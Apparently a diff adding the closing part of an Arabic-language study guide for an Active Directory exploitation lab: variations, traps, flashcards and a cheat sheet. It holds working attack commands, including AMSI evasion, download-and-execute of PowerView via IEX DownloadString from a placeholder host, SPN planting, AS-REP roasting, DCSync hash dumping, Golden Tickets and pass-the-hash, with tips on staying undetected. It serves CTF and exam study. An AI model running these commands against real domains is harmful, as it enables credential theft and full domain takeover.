+🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)
+
+🔄 Variations محتملة:
+
+Variation 1: ماذا لو `IEX DownloadString` انحظر أيضاً بـ AMSI؟
+
+- أحياناً الحماية تكون قوية جداً. الحل هو تحويل سكريبت `PowerView` بالكامل إلى نص مشفر بـ Base64، وبعدين تشغيله.
+    
+
+PowerShell
+
+```
+# تجهيز الكود المشفر (من جهازك)
+$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\PowerView.ps1")
+$encoded = [Convert]::ToBase64String($bytes)
+
+# تنفيذه على الهدف
+powershell.exe -EncodedCommand $encoded
+```
+
+Variation 2: ماذا لو لم تجد أي صلاحيات على اليوزر نفسه؟ (Group Memberships)
+
+- الصلاحيات ما تنربط باليوزر بس، بل تنربط بالجروبات اللي ينتمي إلها. إذا فحصت `wley` وما لكيت شي، ابحث عن الجروبات اللي هو بيها!
+    
+
+PowerShell
+
+```
+# اعرف جروبات اليوزر
+Get-ADUser -Identity wley -Properties MemberOf | Select-Object -ExpandProperty MemberOf
+# بعدين افحص الصلاحيات اللي يمتلكها الجروب
+$groupSID = Convert-NameToSid "IT_Support_Group"
+Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $groupSID}
+```
+
+Variation 3: ماذا لو استخدمت `-ResolveGUIDs` وبقى يطلعلك رقم GUID خام مثل `ab721a53-1e2f-11d0-9819-00aa0040529b`؟
+
+- هذا يعني أن PowerView ما كدر يترجمه. الـ GUIDs بالـ AD مخزنة بمكانين: `Extended-Rights` (لصلاحيات الوصول) و `Schema` (لخصائص الـ Attributes). لازم تبحث بالـ Schema يدوياً:
+    
+
+PowerShell
+
+```
+Get-ADObject -SearchBase "CN=Schema,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'attributeSchema'} -Properties * | Where-Object {$_.schemaIDGUID -eq [guid]'ab721a53-1e2f-11d0-9819-00aa0040529b'} | Select-Object Name
+```
+
+Variation 4: ماذا لو أردت بديل عن أداة PowerView بالكامل بدون تنزيل أي شيء؟ (Built-in Fallback)
+
+- تكدر تستخدم الأوامر الأصلية للويندوز `Get-Acl` مع حلقة تكرار (Loop). هاي الطريقة بطيئة جداً، بس مستحيل ينكشف كفايروس لأنها أوامر نظام شرعية.
+    
+
+PowerShell
+
+```
+# تسحب كل اليوزرات لملف txt، بعدين تسوي Loop يفحص الـ ACL لكل يوزر
+foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
+    Get-Acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'forend'}
+}
+```
+
+Variation 5: ماذا لو كنت تريد تخترق `dpayne` بصمت، بس ما عندك صلاحية تضيف SPN (Kerberoasting فشل)؟
+
+- إذا عندك `GenericAll`، تكدر تستخدم هجوم AS-REP Roasting كبديل! مجرد إنك تعدل خاصية `useraccountcontrol` لليوزر وتضيف إلها قيمة `4194304` (واللي تعني `DONT_REQ_PREAUTH`).
+    
+
+PowerShell
+
+```
+Set-DomainObject -Identity dpayne -XOR @{useraccountcontrol=4194304}
+# بعدها تسحب التذكرة بـ GetNPUsers.py من الكالي.
+```
+
+Variation 6: ماذا لو البيئة كبيرة جداً والبحث النصي معقد؟ (The Professional Shortcut)
+
+- الملاذ الأخير والمفضل للمحترفين هو `BloodHound`. شغل أداة `SharpHound.exe` لجمع الداتا، اسحب ملف الـ ZIP لجهازك، وارميه بواجهة BloodHound (عن طريق `sudo neo4j start` ثم `bloodhound &`). الواجهة الرسومية راح توفرلك استعلامات جاهزة مثل "Find Principals with DCSync Rights" وترسملك الخريطة كاملة بأسهم واضحة، وتغنيك عن قراءة الجداول المزعجة بالـ PowerShell.
+    
+
+═══════════
+
+⚠️ أخطاء كارثية شائعة (الفخوخ المتقدمة):
+
+🚨 فخ الـ GenericWrite على المستخدمين vs الجروبات:
+
+- إذا عندك `GenericWrite` على جروب = تكدر تضيف نفسك كعضو (Add-DomainGroupMember).
+    
+- إذا عندك `GenericWrite` على يوزر = ما تكدر تغير باسورده! بس تكدر تعدل خصائصه (مثل زرع SPN أو تعديل مسار الـ Logon Script). لا تخلط بينهم!
+    
+
+🚨 فخ הـ DCSync بكلمات المرور المتغيرة:
+
+- مرات تسحب هاش الـ Administrator عبر DCSync، بس تجي تسوي Pass-the-Hash وما يشتغل. السبب؟ المطورين أحياناً يخلون حساب الـ Administrator معطل (Disabled) ويستخدمون حسابات مخصصة بأسماء ثانية للـ Domain Admins. الحل: اسحب هاش يوزر فعّال أنت شفته بالـ BloodHound موجود بجروب Domain Admins، أو اسحب هاش `krbtgt` واصنع Golden Ticket.
+    
+
+🚨 فخ الـ AMSI Bypass المؤقت:
+
+- أوامر الـ AMSI Bypass تشتغل فقط على الـ Session (النافذة) المفتوحة حالياً. إذا قفلت الـ PowerShell وفتحته مرة ثانية، الـ Defender راح يرجع يشتغل ولازم تعيد الـ Bypass.
+    
+
+🔑 Golden Tips:
+
+"لا تعتمد أبداً على أداة وحدة. الـ PowerView ممكن ينحظر، الـ BloodHound ممكن ينكشف بالشبكة كحركة غير طبيعية (Noisy). دائماً خلي بجيبك أدوات الويندوز الأصلية `Get-ADObject` و `Get-Acl`. وإذا حصلت GenericAll، فكر بالهدوء قبل الإزعاج: Kerberoasting الموجه والـ ASREPRoasting راح يوفرلك الهاش بدون ما تخلي اليوزر يشك بأي شي."
+
+━━━━━
+
+💎 الفلاشكاردز — ملخص سريع للحفظ
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #1
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: ما هو هجوم DCSync وما هي الصلاحيات المطلوبة لتنفيذه؟
+
+✅ Back: هجوم لسرقة هاشات الباسوردات بانتحال شخصية Domain Controller. يحتاج صلاحيات: DS-Replication-Get-Changes و DS-Replication-Get-Changes-In-Filtered-Set.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #2
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: كيف تقوم بتخطي بطء البحث بأداة PowerView في بيئات العمل الضخمة؟
+
+✅ Back: باستخدام Targeted Enumeration. بدلاً من -Identity *، نحدد اسم الكائن المطلوب: Get-DomainObjectACL -Identity "Username"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #3
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: كيف تستغل صلاحية GenericAll على مستخدم (User) بأكثر طريقة صامتة (Stealthy)؟
+
+✅ Back: عبر Targeted Kerberoasting. نزرع SPN وهمي لليوزر باستخدام Set-DomainObject، ثم نطلب التذكرة عبر GetUserSPNs.py ونكسرها.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #4
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: ماذا تفعل إذا حظر Windows Defender أو AMSI تشغيل ملف PowerView.ps1؟
+
+✅ Back: نستدعيه مباشرة للذاكرة (In-Memory) لتجنب حفظه على القرص، باستخدام IEX و DownloadString.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #5
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: حصلت على صلاحية GenericWrite على جروب معين. ما هي الخطوة الاستغلالية المباشرة؟
+
+✅ Back: إضافة المستخدم الذي اخترقته إلى هذا الجروب للحصول على صلاحيات الجروب، باستخدام Add-DomainGroupMember.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #6
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: ما هي الأداة الأفضل لاستخراج وتصور مسارات الـ ACL المعقدة والمتداخلة كرسومات بيانية؟
+
+✅ Back: BloodHound. نستخدم SharpHound.exe لجمع البيانات (Ingestion)، ثم نستورد الـ ZIP إلى واجهة BloodHound للتحليل المرئي.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #7
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: ماذا تفعل بعد الحصول على NTLM Hash لمدير الشبكة عبر هجوم DCSync؟
+
+✅ Back: لا حاجة لكسره. استخدم تقنية Pass-the-Hash عبر أدوات مثل evil-winrm أو psexec.py لتسجيل الدخول مباشرة كمدير.
+
+━━━━━
+
+📄 ورقة الغش (Cheat Sheet) — للسكرين شوت
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📄 المخلص النهائي (Advanced AD Exploitation Cheat Sheet)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚔️ خوارزمية استغلال الصلاحيات (Post-Enumeration):
+
+١. هل عندك `GenericAll` على مستخدم؟ -> ازرع SPN أو غيّر الباسورد.
+
+٢. هل عندك `GenericWrite` على جروب؟ -> أضف نفسك للجروب.
+
+٣. هل ورثت صلاحيات `DS-Replication...`؟ -> نفذ هجوم DCSync.
+
+٤. استخدم التعداد الموجه (-Identity "Name") دائماً لتسريع العمل وتجنب كشفك.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📐 جدول الأوامر المتقدمة (Exploitation & Bypasses):
+
+|**المجال**|**الهدف**|**الأمر**|
+|---|---|---|
+|Defense Evasion|AMSI Bypass in Memory|`IEX (New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1')`|
+|Targeted Enum|استعلام سريع عن يوزر|`Get-DomainObjectACL -ResolveGUIDs -Identity "TargetUser"`|
+|Abuse|تغيير باسورد بيوزر مفروض|`Set-DomainUserPassword -Identity UserTarget -AccountPassword (ConvertTo-SecureString 'New@123' -AsPlainText -Force)`|
+|Abuse|استخدام Credentials بمتغير|`$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\User', $pass)`|
+|Abuse|إضافة عضو لجروب|`Add-DomainGroupMember -Identity 'Target Group' -Members 'YourUser' -Credential $cred`|
+|Abuse|زرع SPN لغرض Kerberoasting|`Set-DomainObject -Identity TargetUser -SET @{serviceprincipalname='fake/SPN'}`|
+|Abuse|إزالة SPN الوهمي للتنظيف|`Set-DomainObject -Identity TargetUser -Clear serviceprincipalname`|
+|EndGame|سحب التذاكر (Kerberoasting)|`python3 GetUserSPNs.py DOMAIN/User:Pass -dc-ip DC_IP -request -outputfile hashes.txt`|
+|EndGame|سحب كل الهاشات (DCSync)|`python3 secretsdump.py -just-dc DOMAIN/Admin:Pass@DC_IP`|
+|EndGame|سحب هاش يوزر محدد (DCSync)|`python3 secretsdump.py -just-dc-user Administrator DOMAIN/Admin:Pass@DC_IP`|
+|EndGame|تمرير الهاش (Pass-the-Hash)|`evil-winrm -i DC_IP -u Administrator -H <NTLM_HASH>`|
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔢 تحليل صلاحيات الاستغلال السريع:
+
+|**نوع الصلاحية المكتشفة**|**الاستغلال الأفضل والأكثر هدوءاً**|
+|---|---|
+|`GenericWrite` على جروب|أضف نفسك كعضو لوراثة الصلاحيات.|
+|`GenericAll` على مستخدم|Targeted Kerberoasting (زرع SPN).|
+|`GenericWrite` على مستخدم|تعديل الـ Logon Script أو زرع SPN.|
+|`ForceChangePassword`|تغيير الباسورد وتسجيل الدخول كالمستخدم.|
+|`Self-Membership`|إلحاق نفسك مباشرة بالجروب المستهدف.|
+|`Replication Rights`|DCSync الفوري لسحب `krbtgt` و `Administrator`.|
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🚨 الفخوخ المتقدمة (لا تنساها):
+
+❌ إضافة SPN وهمي ونسيان مسحه بعد سحب التذكرة (يعرضك للكشف من فريق الحماية).
+
+❌ تغيير باسورد مستخدم يمتلك GenericAll بشكل عشوائي، مما يمنعه من العمل ويثير إنذاراً مبكراً.
+
+❌ تنفيذ `Identity *` ببيئة إنتاجية ضخمة (يسحب كل ذاكرة السيرفر وممكن يوقفه).
+
+❌ التوقف عند العثور على `GenericWrite` لجروب دون فهم أنك بحاجة لإضافة نفسك لتستفيد من صلاحياته الوراثية.
+
+❌ نسيان سحب هاش `krbtgt` في هجوم DCSync، فهو المفتاح الذهبي لصناعة تذاكر مستدامة حتى لو تم تغيير كلمات المرور.
+
+بهيج خلصنا. هسة عندك:
+
+✅ القصة الكبيرة (كيف نتحول من تعداد إلى سيطرة كاملة بهدوء)
+
+✅ كل المصطلحات (AMSI, DCSync, Shadow Credentials, ASREPRoasting...)
+
+✅ كيفية التفكير (decision trees لتحديد مسار الهجوم حسب نوع الصلاحية)
+
+✅ الاستغلال التفصيلي (خطوة خطوة نحو ضربة الـ DCSync القاضية)
+
+✅ الـ bypasses والـ variations والفخوخ (AMSI Bypass, Nested Groups)
+
+✅ فلاشكاردز (للمراجعة السريعة)
+
+✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)
+
+راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪
+
+
+]
 
 ```text
 ╔══════════════════════════════════════════════════════════════════════╗
